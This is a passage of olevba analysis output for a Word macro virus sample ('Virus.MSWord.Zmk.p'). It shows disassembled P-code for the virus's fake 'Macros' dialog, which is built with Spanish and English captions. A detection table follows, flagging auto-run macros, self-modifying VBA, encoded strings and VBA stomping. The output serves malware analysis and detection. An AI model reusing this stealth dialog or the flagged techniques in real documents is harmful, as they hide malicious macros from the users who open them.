' Line #78:
' 	LitStr 0x0005 "Crear"
' 	Ld CommandButton5 
' 	MemSt Caption 
' Line #79:
' 	LitStr 0x0025 "Crear una macro nueva (no disponible)"
' 	Ld CommandButton5 
' 	MemSt ControlTipText 
' Line #80:
' 	LitStr 0x0008 "Eliminar"
' 	Ld CommandButton7 
' 	MemSt Caption 
' Line #81:
' 	LitStr 0x0037 "Eliminar macro seleccionada (no hay macros disponibles)"
' 	Ld CommandButton7 
' 	MemSt ControlTipText 
' Line #82:
' 	LitStr 0x000E "Organizador..."
' 	Ld CommandButton6 
' 	MemSt Caption 
' Line #83:
' 	LitStr 0x0013 "Nombre de la macro:"
' 	Ld Label3 
' 	MemSt Caption 
' Line #84:
' 	LitStr 0x000A "Macros en:"
' 	Ld Label1 
' 	MemSt Caption 
' Line #85:
' 	LitStr 0x000C "Descripción:"
' 	Ld Label2 
' 	MemSt Caption 
' Line #86:
' Line #87:
' Line #88:
' 	LitStr 0x000B "&Options..."
' 	Case 
' 	CaseDone 
' Line #89:
' 	LitStr 0x0022 "All templates and active documents"
' 	St PyD 
' Line #90:
' 	LitStr 0x001C "Normal.dot (global template)"
' 	St Pg 
' Line #91:
' 	LitStr 0x000D "Word commands"
' 	St Cw 
' Line #92:
' 	LitStr 0x000B " (document)"
' 	St Dc 
' Line #93:
' 	LitStr 0x000F "Macros made on "
' 	St Mc 
' Line #94:
' 	LitStr 0x0004 " by "
' 	St Pr 
' Line #95:
' 	LitStr 0x0003 "Run"
' 	Ld CommandButton1 
' 	MemSt Caption 
' Line #96:
' 	LitStr 0x0028 "Run selected macro (no macros available)"
' 	Ld CommandButton1 
' 	MemSt ControlTipText 
' Line #97:
' 	LitStr 0x0006 "Cancel"
' 	Ld CommandButton2 
' 	MemSt Caption 
' Line #98:
' 	LitStr 0x0010 "Cancel selection"
' 	Ld CommandButton2 
' 	MemSt ControlTipText 
' Line #99:
' 	LitStr 0x000C "Step by step"
' 	Ld CommandButton3 
' 	MemSt Caption 
' Line #100:
' 	LitStr 0x0016 "Run macro step by step"
' 	Ld CommandButton3 
' 	MemSt ControlTipText 
' Line #101:
' 	LitStr 0x0006 "Modify"
' 	Ld CommandButton4 
' 	MemSt Caption 
' Line #102:
' 	LitStr 0x0038 "Modify selected macro seleccionada (no macros available)"
' 	Ld CommandButton4 
' 	MemSt ControlTipText 
' Line #103:
' 	LitStr 0x0003 "New"
' 	Ld CommandButton5 
' 	MemSt Caption 
' Line #104:
' 	LitStr 0x0022 "Create a new macro (not available)"
' 	Ld CommandButton5 
' 	MemSt ControlTipText 
' Line #105:
' 	LitStr 0x0006 "Delete"
' 	Ld CommandButton7 
' 	MemSt Caption 
' Line #106:
' 	LitStr 0x0029 "Delete selected macro (no macro selected)"
' 	Ld CommandButton7 
' 	MemSt ControlTipText 
' Line #107:
' 	LitStr 0x000C "Organizer..."
' 	Ld CommandButton6 
' 	MemSt Caption 
' Line #108:
' 	LitStr 0x000B "Macro name:"
' 	Ld Label3 
' 	MemSt Caption 
' Line #109:
' 	LitStr 0x000A "Macros in:"
' 	Ld Label1 
' 	MemSt Caption 
' Line #110:
' 	LitStr 0x000C "Description:"
' 	Ld Label2 
' 	MemSt Caption 
' Line #111:
' 	EndSelect 
' Line #112:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	St docn 
' Line #113:
' 	Ld Application 
' 	MemLd UserName 
' 	St user 
' Line #114:
' 	Ld PyD 
' 	Ld ComboBox1 
' 	MemSt Then 
' Line #115:
' 	Ld PyD 
' 	Paren 
' 	LitDI2 0x0000 
' 	Ld ComboBox1 
' 	ArgsMemCall AddItem 0x0002 
' Line #116:
' 	Ld Pg 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld ComboBox1 
' 	ArgsMemCall AddItem 0x0002 
' Line #117:
' 	Ld Cw 
' 	Paren 
' 	LitDI2 0x0002 
' 	Ld ComboBox1 
' 	ArgsMemCall AddItem 0x0002 
' Line #118:
' 	Ld docn 
' 	Ld Dc 
' 	Concat 
' 	Paren 
' 	LitDI2 0x0003 
' 	Ld ComboBox1 
' 	ArgsMemCall AddItem 0x0002 
' Line #119:
' 	LitStr 0x0000 ""
' 	Paren 
' 	LitDI2 0x0004 
' 	Ld ComboBox1 
' 	ArgsMemCall AddItem 0x0002 
' Line #120:
' 	LitStr 0x0000 ""
' 	Paren 
' 	LitDI2 0x0005 
' 	Ld ComboBox1 
' 	ArgsMemCall AddItem 0x0002 
' Line #121:
' 	Ld Mc 
' 	Ld Date 
' 	Concat 
' 	Ld Pr 
' 	Concat 
' 	Ld user 
' 	Concat 
' 	Ld TextBox1 
' 	MemSt Then 
' Line #122:
' Line #123:
' 	EndSub 
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton4'" IN 'Virus.MSWord.Zmk.p' - OLE stream: 'Macros/oswf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Zmk.p' - OLE stream: 'Macros/oswf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.Zmk.p' - OLE stream: 'Macros/oswf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton3'" IN 'Virus.MSWord.Zmk.p' - OLE stream: 'Macros/oswf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton5'" IN 'Virus.MSWord.Zmk.p' - OLE stream: 'Macros/oswf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton6'" IN 'Virus.MSWord.Zmk.p' - OLE stream: 'Macros/oswf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton7'" IN 'Virus.MSWord.Zmk.p' - OLE stream: 'Macros/oswf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Virus.MSWord.Zmk.p' - OLE stream: 'Macros/oswf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Zmk.p' - OLE stream: 'Macros/oswf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Zmk.p' - OLE stream: 'Macros/oswf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Zmk.p' - OLE stream: 'Macros/oswf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ScrollBar1'" IN 'Virus.MSWord.Zmk.p' - OLE stream: 'Macros/oswf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox2'" IN 'Virus.MSWord.Zmk.p' - OLE stream: 'Macros/oswf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'Virus.MSWord.Zmk.p' - OLE stream: 'Macros/oswf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox1'" IN 'Virus.MSWord.Zmk.p' - OLE stream: 'Macros/oswf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

